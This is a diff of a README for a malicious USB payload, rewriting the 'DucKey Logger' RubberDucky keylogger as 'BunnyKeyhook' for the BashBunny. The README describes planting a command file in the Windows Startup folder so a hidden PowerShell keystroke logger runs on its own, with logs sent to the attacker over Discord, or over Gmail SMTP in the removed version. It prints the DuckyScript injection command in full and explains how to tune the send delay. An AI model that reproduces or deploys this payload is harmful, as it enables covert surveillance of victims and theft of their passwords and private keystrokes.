@@ -1,57 +1,49 @@
-# DucKey Logger V.2 
-> Chris Taylor [Blue Cosmo] | 08/24/21
+# BunnyKeyhook
+> Chris Taylor [Blue Cosmo]
 ---
 
 ```
-:::::::::  :::    :::  ::::::::  :::    ::: :::::::::: :::   :::
-:+:    :+: :+:    :+: :+:    :+: :+:   :+:  :+:        :+:   :+:
-+:+    +:+ +:+    +:+ +:+        +:+  +:+   +:+         +:+ +:+  
-+#+    +:+ +#+    +:+ +#+        +#++:++    +#++:++#     +#++:   
-+#+    +#+ +#+    +#+ +#+        +#+  +#+   +#+           +#+    
-#+#    #+# #+#    #+# #+#    #+# #+#   #+#  #+#           #+#    
-#########   ########   ########  ###    ### ##########    ###     
+__________                            ____  __.            .__                   __    
+\______   \__ __  ____   ____ ___.__.|    |/ _|____ ___.__.|  |__   ____   ____ |  | __
+ |    |  _/  |  \/    \ /    <   |  ||      <_/ __ <   |  ||  |  \ /  _ \ /  _ \|  |/ /
+ |    |   \  |  /   |  \   |  \___  ||    |  \  ___/\___  ||   Y  (  <_> |  <_> )    < 
+ |______  /____/|___|  /___|  / ____||____|__ \___  > ____||___|  /\____/ \____/|__|_ \
+        \/           \/     \/\/             \/   \/\/          \/                   \/   
 ```
-
-## Update:
-logs can now be sent every hour
 
 ## Overview:
 ```
-DucKey Logger is a USB RubberDucky payload that uses PowerShell to log keystrokes
+BunnyKeyhook is a BashBunny payload that uses PowerShell to log keystrokes. It will send the logs to you via discord. The keylogger almost gives you a "live feed" of their keystrokes through discord. However, you can tweak the timing to get the logs sent to you quick
 ```
 - moves *c.cmd* file to windows startup directory
 - *c.cmd* will secretly run *p.ps1*
 - *p.ps1* will log keystrokes 
-- *l.ps1* will email the logs every startup and every hour [via SMTP]
-    - sends logs hourly, regardless of system time
+- *l.ps1* will execute *p.ps1* every minue
+    - this can be changed to a preferred delay
 
 ## Resources:
-- [YouTube Video](https://www.youtube.com/watch?v=uHIZZYFeVJA)
+- [YouTube Video](https://youtu.be/U74QqEa4GRc)
 - [YouTube Channel](https://youtube.com/cosmodiumcs)
 - [Website](https://cosmodiumcs.com)
 
 ## Requirements:
-- Twin-Duck firmware
-- Gmail account
-    - i suggest making a separate Gmail account for this payload
-    - your Gmail must have [LSA Access](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Px2VEFPoFPEuLutMD6UhNVRyY9P3s7l-pCGA53NBqilKVrtltrfS1823x5i6k6_pSEVp6jkEW0zKQT2CHN0WXh4fvGiw) enabled
-- Windows 10 Target
+- Windows Target
 
 ## Instructions:
 Set-Up/Installation
-1. change Gmail credentials in *p.ps1*
+1. in line 17 of *duckyscript.txt*, change change `'BashBunny'` to the name of your Bash Bunny
+2. in line 17 *duckyscript.txt*, change `switch1` to switch position that stores the paylaod
+    - make sure to replace *all* appearances of `switch1` if you decide to change 
 ```powershell
-# gmail credentials
-$email = "example@gmail.com"
-$password = "password"
+STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name;cp .\payloads\switch1\p.ps1 $env:temp;cp .\payloads\switch1\l.ps1 $env:temp;cp .\payloads\switch1\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
 ```
-2. in line 20 of *payload.txt*, change 'L' to the name of your ducky [SD Card]
+
+## Log Sending Delay
+Changing the delay between log sends
+1. in line 12 of *l.ps1*, change `60` to your preferred number of seconds
 ```powershell
-STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\p.ps1 $env:temp;cp .\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
+Start-Sleep 60
 ```
-3. flash Twin-Duck firmware on to your duck
-    - [Tutorial](https://www.youtube.com/watch?v=BzYH-BPHLpE)
-4. load, encode, and deploy!!
 
 ## Extraneous:
 The *c.cmd* attack opportunity
